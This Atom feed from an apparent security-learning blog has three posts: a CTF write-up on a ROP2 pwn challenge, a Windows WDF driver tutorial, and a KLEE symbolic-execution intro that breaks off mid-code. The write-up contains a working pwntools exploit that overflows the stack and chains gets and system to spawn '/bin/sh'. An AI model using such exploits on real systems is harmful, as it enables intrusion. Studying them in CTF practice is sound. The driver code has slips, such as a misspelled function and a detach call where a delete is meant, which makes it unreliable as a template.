<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>bufsnake</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bufsnake.github.io/"/>
  <updated>2019-08-09T15:03:10.704Z</updated>
  <id>https://bufsnake.github.io/</id>
  
  <author>
    <name>bufsnake</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN 学习—某平台ROP2 writeup</title>
    <link href="https://bufsnake.github.io/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html"/>
    <id>https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html</id>
    <published>2019-08-02T09:16:46.000Z</published>
    <updated>2019-08-09T15:03:10.704Z</updated>
    
    <content type="html"><![CDATA[<h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="/images/1/1.png" alt="在这里插入图片描述"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="/images/1/2.png" alt="在这里插入图片描述"></p><blockquote><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p></blockquote><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="/images/1/3.png" alt="在这里插入图片描述"></p><blockquote><p>发现输入一定的长度，程序就崩溃了</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="/images/1/4.png" alt="在这里插入图片描述"></p><blockquote><p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p></blockquote><h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="/images/1/5.png" alt="在这里插入图片描述"></p><h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="/images/1/6.png" alt="在这里插入图片描述"></p><blockquote><p>似乎用不到的函数</p></blockquote><h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="/images/1/7.png" alt="在这里插入图片描述"></p><blockquote><p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p></blockquote><h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote><p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p></blockquote><h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="/images/1/8.png" alt="在这里插入图片描述"></p><blockquote><p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p></blockquote><pre><code>接下来时调用system函数</code></pre><blockquote><p>我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方<br>我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，<br>gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用</p></blockquote><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><p><img src="/images/1/9.png" alt="在这里插入图片描述"></p><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = remote(<span class="string">"ip"</span>,port)</span><br><span class="line">pros = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6010F0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line">system_addr = pros.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = pros.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +<span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)</span><br><span class="line">pro.readuntil(<span class="string">"~"</span>)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/1/10.png" alt="在这里插入图片描述"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;64位栈帧学习&quot;&gt;&lt;a href=&quot;#64位栈帧学习&quot; class=&quot;headerlink&quot; title=&quot;64位栈帧学习&quot;&gt;&lt;/a&gt;64位栈帧学习&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/1/1.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
&lt;h
      
    
    </summary>
    
      <category term="-pwn" scheme="https://bufsnake.github.io/categories/pwn/"/>
    
    
      <category term="-writeup -pwntools -pwn -rop" scheme="https://bufsnake.github.io/tags/writeup-pwntools-pwn-rop/"/>
    
  </entry>
  
  <entry>
    <title>WDF-helloworld</title>
    <link href="https://bufsnake.github.io/WDF-helloworld.html"/>
    <id>https://bufsnake.github.io/WDF-helloworld.html</id>
    <published>2019-06-02T07:50:58.000Z</published>
    <updated>2019-06-02T07:55:48.992Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Windows WDF驱动开发简单helloworld入门</p></blockquote><h2 id="helloworld-h"><a href="#helloworld-h" class="headerlink" title="helloworld.h"></a>helloworld.h</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">预处理：用来避免头文件被重复包含</span></span><br><span class="line"><span class="comment">还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一种：</span></span><br><span class="line"><span class="comment">#ifndef __SOMEFILE_H__</span></span><br><span class="line"><span class="comment">#define __SOMEFILE_H__</span></span><br><span class="line"><span class="comment">... ... // 声明、定义语句</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">第二种：</span></span><br><span class="line"><span class="comment">#pragma once</span></span><br><span class="line"><span class="comment">... ... // 声明、定义语句</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __HELLOWORLD__ <span class="comment">//预处理</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HELLOWORLD__ <span class="comment">//预处理</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含驱动所需的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wdf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_EXTENSION</span> &#123;</span></span><br><span class="line">PDEVICE_OBJECT DeviceObject;</span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING SymbolicLink;</span><br><span class="line">&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相关函数的声明，这些函数的具体实现存在于定义文件中</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PUNICODE_STRING RegPath</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT DriverObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DefaultDispath</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDEVICE_OBJECT DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PIRP Irp</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//预处理</span></span></span><br></pre></td></tr></table></figure><h2 id="helloworld-c"><a href="#helloworld-c" class="headerlink" title="helloworld.c"></a>helloworld.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"helloworld.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。</span></span><br><span class="line"><span class="comment">// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。</span></span><br><span class="line"><span class="comment">// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。</span></span><br><span class="line"><span class="comment">// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。</span></span><br><span class="line"><span class="comment">// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(INIT,DriverEntry)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE,DefaultDispatch)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE,DriverUnload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT Driver,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PUNICODE_STRING RegPath</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 函数相关变量的定义</span></span><br><span class="line"><span class="comment">// C语言中变量必须定义在函数体的开始处，否则出现编译错误。</span></span><br><span class="line"><span class="comment">// C++ 语言没有这种限制</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line">PDEVICE_OBJECT deviceObject;</span><br><span class="line">PDEVICE_EXTENSION deviceExtension;</span><br><span class="line">UNICODE_STRING symbolicLink;</span><br><span class="line">UNICODE_STRING deviceName;</span><br><span class="line">ULONG i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于</span></span><br><span class="line"><span class="comment">// 调试版本编译时，KdPrint会打印调试信息，</span></span><br><span class="line"><span class="comment">// 发布版本编译时，KdPrint将会被全部移除。</span></span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DriverEntry\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告</span></span><br><span class="line"><span class="comment">// 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题</span></span><br><span class="line">UNREFERENCED_PARAMETER(RegPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数)</span></span><br><span class="line">RtlInitUnicodeString(&amp;deviceName, <span class="string">L"\\Device\\helloworld"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。</span></span><br><span class="line"><span class="comment">// 类似于定义数组，初始化数组</span></span><br><span class="line"><span class="comment">// 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">Driver-&gt;MajorFunction[i] = DefaultDispatch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。</span></span><br><span class="line">Driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换</span></span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。</span></span><br><span class="line">status = IoCreateDevice(Driver, <span class="keyword">sizeof</span>(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;deviceObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式</span></span><br><span class="line">deviceObject-&gt;Flags = DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。</span></span><br><span class="line">deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;</span><br><span class="line">deviceExtension-&gt;DeviceObject = deviceObject;</span><br><span class="line">deviceExtension-&gt;DeviceName = deviceName;</span><br><span class="line">RtlInitUnicodeString(&amp;symbolicLink, <span class="string">L"\\??\\helloworld"</span>);</span><br><span class="line">deviceExtension-&gt;SymbolicLink = symbolicLink;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信</span></span><br><span class="line">status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName);</span><br><span class="line"><span class="comment">//对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">IoDeleteDevice(deviceObject);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KdPrint((<span class="string">"End HelloWorld DriverEntry\n"</span>));</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">PDEVICE_OBJECT deviceObject;</span><br><span class="line">UNICODE_STRING linkName;</span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DriverUnload\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由驱动对象指针得到设备对象指针</span></span><br><span class="line">deviceObject = DriverObject-&gt;DeviceObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有已经穿件的设备对象和设备符号链接，并将其删除</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">NULL</span> != deviceObject)</span><br><span class="line">&#123;</span><br><span class="line">PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;</span><br><span class="line"></span><br><span class="line">linkName = deviceExtension-&gt;SymbolicLink;</span><br><span class="line">IoDeleteSymbolicLink(&amp;linkName);</span><br><span class="line">deviceObject = deviceObject-&gt;NextDevice;</span><br><span class="line">IoDetachDevice(deviceExtension-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br><span class="line">KdPrint((<span class="string">"End of HelloWorld DriverUnload"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DefaultDispatch</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDEVICE_OBJECT DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PIRP Irp</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS status;</span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DefaultDispatch"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定参数未被引用，避免不必要的警告</span></span><br><span class="line">UNREFERENCED_PARAMETER(DeviceObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置IRP的状态为成功</span></span><br><span class="line">status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0</span></span><br><span class="line">Irp-&gt;IoStatus.Status = status;</span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用IoCompleteRequest函数直接完成IRP</span></span><br><span class="line">IoCompleteRequest(Irp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">KdPrint((<span class="string">"End of HelloWorld DefaultDispatch\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="驱动开发所需要的工具"><a href="#驱动开发所需要的工具" class="headerlink" title="驱动开发所需要的工具"></a>驱动开发所需要的工具</h2><blockquote><p>Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。</p></blockquote><blockquote><p>DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。</p></blockquote><blockquote><p>InstDrv：安装驱动程序的软件，也可以自己编写。</p></blockquote><blockquote><p>DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。</p></blockquote><blockquote><p>DeviceTree：设备树，查看驱动对象和设备对象。</p></blockquote><blockquote><p>PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。</p></blockquote><blockquote><p>WinObj：驱动对象和设备对象的普通查看工具</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Windows WDF驱动开发简单helloworld入门&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;helloworld-h&quot;&gt;&lt;a href=&quot;#helloworld-h&quot; class=&quot;headerlink&quot; title=&quot;hell
      
    
    </summary>
    
      <category term="Windows驱动开发" scheme="https://bufsnake.github.io/categories/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Windows wdf驱动开发" scheme="https://bufsnake.github.io/tags/Windows-wdf%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="WDF" scheme="https://bufsnake.github.io/tags/WDF/"/>
    
  </entry>
  
  <entry>
    <title>KLEE-符号执行框架</title>
    <link href="https://bufsnake.github.io/KLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html"/>
    <id>https://bufsnake.github.io/KLEE-符号执行框架.html</id>
    <published>2019-05-31T12:21:03.000Z</published>
    <updated>2019-05-31T12:42:11.914Z</updated>
    
    <content type="html"><![CDATA[<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><blockquote><p>通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出</p></blockquote><h3 id="KLEE"><a href="#KLEE" class="headerlink" title="KLEE"></a>KLEE</h3><h4 id="安装-推荐使用Docker安装-："><a href="#安装-推荐使用Docker安装-：" class="headerlink" title="安装(推荐使用Docker安装)："></a>安装(推荐使用Docker安装)：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull klee/klee:2.0</span><br><span class="line"></span><br><span class="line">持久性容器:当退出容器时，容器里面的内容不会初始化</span><br><span class="line">docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee</span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start -ai namestring</span><br></pre></td></tr></table></figure><h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><blockquote><p>给出的是官方实例的代码</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;klee/klee.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sign</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  klee_make_symbolic(&amp;a, <span class="keyword">sizeof</span>(a), <span class="string">"a"</span>);</span><br><span class="line">  <span class="keyword">return</span> get_sign(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到程序有三条路径输出</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -<span class="built_in">disable</span>-O0-optnone get_sign.c</span><br></pre></td></tr></table></figure><blockquote><p>编译生成 get_sign.bc 文件，用klee 运行一下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 